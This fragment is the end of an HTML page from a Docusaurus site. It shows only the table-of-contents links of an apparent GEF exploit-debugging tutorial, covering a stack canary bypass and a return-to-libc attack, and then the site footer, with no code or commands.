Stack Canary Bypass</a></li><li><a href="#scenario-3-return-to-libc-attack" class="table-of-contents__link toc-highlight">Scenario 3: Return-to-libc Attack</a></li></ul></li><li><a href="#debugging-tips-and-best-practices" class="table-of-contents__link toc-highlight">Debugging Tips and Best Practices</a><ul><li><a href="#essential-gef-configuration" class="table-of-contents__link toc-highlight">Essential GEF Configuration</a></li><li><a href="#common-pitfalls-and-solutions" class="table-of-contents__link toc-highlight">Common Pitfalls and Solutions</a></li><li><a href="#advanced-automation" class="table-of-contents__link toc-highlight">Advanced Automation</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">¬© 2025 gl0bal01. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>